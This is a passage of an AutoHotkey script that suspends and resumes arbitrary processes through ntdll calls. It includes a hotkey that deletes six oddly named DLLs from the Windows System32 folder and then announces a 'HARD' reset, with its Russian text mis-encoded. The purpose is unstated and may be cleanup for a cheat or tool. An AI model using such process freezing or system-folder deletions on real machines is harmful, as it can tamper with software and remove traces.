h:=DllCall("OpenProcess", "uInt", 0x1F0FFF, "Int", 0, "Int", pid)
If !h
Return -1
DllCall("ntdll.dll\NtSuspendProcess", "Int", h)
DllCall("CloseHandle", "Int", h)
}
Process_Resume(PID_or_Name){
PID := (InStr(PID_or_Name,".")) ? ProcExist(PID_or_Name) : PID_or_Name
h:=DllCall("OpenProcess", "uInt", 0x1F0FFF, "Int", 0, "Int", pid)
If !h
Return -1
DllCall("ntdll.dll\NtResumeProcess", "Int", h)
DllCall("CloseHandle", "Int", h)
}
ProcExist(PID_or_Name=""){
Process, Exist, % (PID_or_Name="") ? DllCall("GetCurrentProcessID") : PID_or_Name
Return Errorlevel
}
^0::
FileDelete, C:\Windows\System32\Vasta.dll
FileDelete, C:\Windows\System32\Micropov.dll
FileDelete, C:\Windows\System32\Chrom3Alt.dll
FileDelete, C:\Windows\System32\ChromAltMY.dll
FileDelete, C:\Windows\System32\Blet.dll
FileDelete, C:\Windows\System32\Slet.dll
SplashTextOn , 200, 100, `nSee you soon!!!, Done! HARD Reseted!`n`nÐ“Ð¾Ñ‚Ð¾Ð²Ð¾! HARD Ð¡Ð±Ñ€Ð¾ÑˆÐµÐ½Ð¾!
Sleep, 3000
SplashTextOff
exit